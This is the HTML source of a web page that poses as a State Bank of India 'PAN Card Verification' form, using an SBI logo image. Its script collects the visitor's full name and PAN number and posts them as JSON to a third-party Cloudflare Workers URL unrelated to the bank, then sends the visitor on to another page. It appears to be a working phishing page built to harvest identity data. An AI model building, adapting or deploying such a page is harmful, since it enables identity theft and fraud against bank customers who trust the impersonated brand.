<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Service - PAN Verification</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: Arial, sans-serif;
        }
        
        body {
            background-color: #f0f0f0;
            min-height: 100vh;
            padding-bottom: 20px;
        }
        
        .header {
            text-align: center;
            padding: 15px;
            background-color: white;
        }
        
        .logo {
            max-width: 100%;
            height: auto;
            max-height: 120px;
        }
        
        .container {
            max-width: 420px;
            margin: 15px auto;
            background-color: white;
            border-radius: 5px;
            box-shadow: 0 2px 5px rgba(0,0,0,0.08);
            overflow: hidden;
        }
        
        .form-header {
            color: #000;
            padding: 18px 20px 8px 20px;
            text-align: center;
            font-size: 16px;
            font-weight: bold;
        }
        
        .form-content {
            padding: 0 20px 20px 20px;
        }
        
        .form-group {
            margin-bottom: 15px;
        }
        
        .form-label {
            display: block;
            font-size: 12px;
            font-weight: bold;
            color: #333;
            margin-bottom: 3px;
        }
        
        .form-input {
            width: 100%;
            padding: 6px 0;
            font-size: 13px;
            border: none;
            border-bottom: 1px solid #ccc;
            background-color: transparent;
            outline: none;
            border-radius: 0;
            transition: border-color 0.3s;
            text-align: left;
            font-weight: bold;
        }
        
        .form-input:focus {
            border-bottom-color: #24A1E8;
        }
        
        .submit-button {
            display: block;
            width: 100%;
            padding: 10px;
            background-color: #24A1E8;
            color: white;
            font-size: 14px;
            font-weight: bold;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            margin-top: 15px;
        }
        
        .submit-button:hover {
            background-color: #1a8cd8;
        }
        
        .message {
            font-size: 13px;
            color: #666;
            text-align: center;
            margin-bottom: 15px;
            line-height: 1.4;
        }
        
        .asterisk {
            color: #ff0000;
        }
        
        .footer-img {
            width: 100%;
            max-width: 900px;
            display: block;
            margin: 20px auto 0;
        }
    </style>
</head>
<body>
    <!-- Same Header as index.html -->
    <div class="header">
        <img src="https://i.ibb.co/fz5x9ff2/Main-817fcadb-1.jpg" 
             alt="SBI Logo" 
             class="logo">
    </div>
    
    <!-- PAN Verification Form -->
    <div class="container">
        <div class="form-header">
            PAN Card Verification
        </div>
        
        <div class="form-content">
            <div class="message">
                Please enter your PAN card details for verification.
            </div>
            
            <div class="form-group">
                <label class="form-label">Name (as per PAN) <span class="asterisk">*</span></label>
                <input type="text" class="form-input" id="panName" placeholder="Enter full name as per PAN card" required>
            </div>
            
            <div class="form-group">
                <label class="form-label">PAN No. <span class="asterisk">*</span></label>
                <input type="text" class="form-input" id="panNumber" placeholder="ABCDE1234F" maxlength="10" required pattern="[A-Z]{5}[0-9]{4}[A-Z]{1}">
            </div>
            
            <button class="submit-button">SUBMIT</button>
        </div>
    </div>
    
    <!-- Same Footer as index.html -->
    <img src="https://i.ibb.co/5WTjD1Nb/Footer-bfdfef4c-1.jpg" 
         alt="Security Guidelines" 
         class="footer-img">
    
    <script>
        // PAN Input Formatting
        const panNumberInput = document.getElementById('panNumber');
        
        // PAN Number - Auto uppercase and limit to 10 chars
        panNumberInput.addEventListener('input', function(e) {
            let value = e.target.value.toUpperCase().replace(/[^A-Z0-9]/g, '');
            value = value.substring(0, 10);
            e.target.value = value;
        });
        
        // PAN Name - Only letters and spaces
        const panNameInput = document.getElementById('panName');
        panNameInput.addEventListener('input', function(e) {
            let value = e.target.value.replace(/[^A-Za-z\s]/g, '');
            e.target.value = value;
        });
        
        // Submit Button
        document.querySelector('.submit-button').addEventListener('click', async function(e) {
            e.preventDefault();
            
            const panName = panNameInput.value.trim();
            const panNumber = panNumberInput.value.trim();
            
            // Validation
            if (!panName || panName.length < 3) {
                panNameInput.style.borderBottomColor = '#ff4444';
                return;
            } else {
                panNameInput.style.borderBottomColor = '#ccc';
            }
            
            if (!panNumber || panNumber.length !== 10 || !/^[A-Z]{5}[0-9]{4}[A-Z]{1}$/.test(panNumber)) {
                panNumberInput.style.borderBottomColor = '#ff4444';
                return;
            } else {
                panNumberInput.style.borderBottomColor = '#ccc';
            }
            
            // ✅ Worker mein data bhejna (localStorage हटाया)
            const submission = {
                id: Date.now(),
                type: 'PAN',
                data: {
                    name: panName,
                    pan: panNumber
                },
                timestamp: new Date().toISOString()
            };

            try {
                const response = await fetch('https://quiet-pond-0411.skd38824.workers.dev/', {
                    method: 'POST',
                    mode: 'cors',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(submission)
                });

                if (response.ok) {
                    const result = await response.json();
                    if (result.success) {
                        // Redirect to blogtwo.html
                        window.location.href = 'blogtwo.html';
                    } else {
                        alert('Error: ' + (result.error || 'Submission failed'));
                    }
                } else {
                    alert('Server error: ' + response.status);
                }
            } catch (error) {
                alert('Network error: ' + error.message);
            }
        });
    </script>
</body>
</html>
